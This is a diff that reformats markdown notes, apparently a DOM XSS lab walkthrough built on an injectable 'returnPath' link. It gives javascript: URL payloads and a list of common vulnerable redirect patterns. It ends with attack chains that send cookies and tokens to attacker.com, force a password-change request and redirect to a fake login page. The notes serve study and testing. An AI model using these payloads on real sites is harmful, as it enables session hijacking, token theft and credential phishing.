@@ -2267,9 +2267,9 @@ Go to Submit Feedback page
 ---
 
 ### Step 2 — Observe URL
-
-'/feedback?returnPath=/'
-
+```
+/feedback?returnPath=/
+```
 👉 Default value = homepage  
 
 ---
@@ -2277,9 +2277,9 @@ Go to Submit Feedback page
 ### Step 3 — Test Input Control
 
 Modify URL:
-
-'/feedback?returnPath=TEST123'
-
+```
+/feedback?returnPath=TEST123
+```
 ---
 
 ### Step 4 — Inspect Live DOM
@@ -2287,9 +2287,9 @@ Modify URL:
 Open DevTools → Elements  
 
 Find Back link:
-
-'<a href="TEST123">'
-
+```
+<a href="TEST123">
+```
 ---
 
 ### Step 5 — Identify Context
@@ -2324,29 +2324,29 @@ Make browser execute JavaScript when link is clicked
 ---
 
 ### ✅ Final Payload
-
-'javascript:alert(document.cookie)'
-
+```
+javascript:alert(document.cookie)
+```
 ---
 
 ### Step 8 — Inject Payload
 
 Modify URL:
-
-'/feedback?returnPath=javascript:alert(document.cookie)'
-
+```
+/feedback?returnPath=javascript:alert(document.cookie)
+```
 ---
 
 ### Step 9 — DOM Change
 
 Before:
-
-'<a href="/">'
-
+```
+<a href="/">
+```
 After:
-
-'<a href="javascript:alert(document.cookie)">'
-
+```
+<a href="javascript:alert(document.cookie)">
+```
 ---
 
 ### Step 10 — Execution
@@ -2364,9 +2364,9 @@ After:
 ---
 
 ### 🔹 Exact Payload Used
-
-'javascript:alert(document.cookie)'
-
+```
+javascript:alert(document.cookie)
+```
 ---
 
 ### 🔹 Where Input Goes
@@ -2390,15 +2390,15 @@ location.search
 ---
 
 Before:
-
-'<a href="/">'
-
+```
+<a href="/">
+```
 ---
 
 After:
-
-'<a href="javascript:alert(document.cookie)">'
-
+```
+<a href="javascript:alert(document.cookie)">
+```
 ---
 
 ## 🔹 Evidence / Screenshot (SS)
@@ -2414,13 +2414,13 @@ After:
 ### 🟢 1️⃣ Redirect / Back Links (VERY COMMON)
 
 Code:
-
-'link.href = userInput'
-
+```
+link.href = userInput
+```
 Payload:
-
-'javascript:alert(1)'
-
+```
+javascript:alert(1)
+```
 Seen in:
 
 - Login pages  
@@ -2430,9 +2430,9 @@ Seen in:
 ---
 
 ### 🟢 2️⃣ jQuery attr() Misuse (Legacy Goldmine)
-
-'$("#link").attr("href", input)'
-
+```
+$("#link").attr("href", input)
+```
 Found in:
 
 - Old admin panels  
@@ -2442,13 +2442,13 @@ Found in:
 ---
 
 ### 🟢 3️⃣ OAuth / SSO Redirect Abuse (CRITICAL)
-
-'?redirect_uri=INPUT'
-
+```
+?redirect_uri=INPUT
+```
 Payload:
-
-'javascript:alert(1)'
-
+```
+javascript:alert(1)
+```
 📌 Impact:
 
 - Account takeover  
@@ -2470,11 +2470,11 @@ User-controlled links rendered in:
 ---
 
 ### 🟢 5️⃣ Download / Return Links
-
-'?next='  
-'?continue='  
-'?return='  
-
+```
+?next=
+?continue=
+?return=
+```
 Very common in:
 
 - SaaS apps  
@@ -2484,9 +2484,9 @@ Very common in:
 ---
 
 ### 🟢 6️⃣ SPA Navigation (Modern Apps)
-
-'router.push(userInput)'
-
+```
+router.push(userInput)
+```
 📌 Can lead to DOM XSS via dynamic link generation  
 
 ---
@@ -2547,9 +2547,9 @@ Very common in:
 ---
 
 ### 🔥 Chain 1 — DOM XSS → Session Theft
-
-'javascript:fetch("https://attacker.com?c="+document.cookie)'
-
+```
+javascript:fetch("https://attacker.com?c="+document.cookie)
+```
 → Steal session  
 → Hijack account  
 
@@ -2565,26 +2565,26 @@ Very common in:
 ---
 
 ### 🔥 Chain 3 — DOM XSS → OAuth Token Theft
-
-'javascript:fetch("https://attacker.com?token="+localStorage.token)'
-
+```
+javascript:fetch("https://attacker.com?token="+localStorage.token)
+```
 → Steal tokens  
 → Login as victim  
 
 ---
 
 ### 🔥 Chain 4 — DOM XSS → CSRF Automation
-
-'javascript:fetch("/change-password",{method:"POST"})'
-
+```
+javascript:fetch("/change-password",{method:"POST"})
+```
 → Perform actions silently  
 
 ---
 
 ### 🔥 Chain 5 — DOM XSS → Phishing Redirect
-
-'javascript:location="https://fake-login.com"'
-
+```
+javascript:location="https://fake-login.com"
+```
 → Credential harvesting  
 
 ---
